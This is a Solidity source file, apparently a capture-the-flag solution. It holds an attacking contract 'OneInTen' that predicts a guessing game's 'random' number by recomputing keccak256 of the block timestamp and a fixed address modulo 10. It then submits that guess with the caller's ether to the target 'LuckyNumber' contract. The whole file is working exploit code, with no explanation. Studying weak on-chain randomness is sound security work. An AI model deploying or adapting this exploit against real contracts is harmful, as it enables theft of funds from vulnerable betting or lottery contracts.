pragma solidity ^0.4.20;

contract LuckyNumber {
  function takeAGuess(uint8 _myGuess) public payable {}
}

contract OneInTen {
  function call(address contract_address) public payable {
    LuckyNumber(contract_address).takeAGuess.value(msg.value)(uint8(keccak256(now, address(0xd777c3F176D125962C598E8e1162E52c6C403606)))%10);
  }
}